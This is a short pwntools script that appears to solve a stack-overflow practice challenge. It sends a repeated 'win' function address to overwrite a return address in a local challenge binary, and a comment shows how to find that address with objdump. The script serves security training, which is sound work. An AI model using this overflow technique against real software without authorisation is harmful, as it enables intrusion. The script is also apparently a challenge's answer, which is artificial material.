import pwn

proc = pwn.process("/challenge/stackoverflow_level2")

# get win function address by running:
# objdump -d /challenge/stackoverflow_level2 | grep win
proc.send(pwn.p64(0x4012fd)*100)

proc.interactive()
proc.wait()
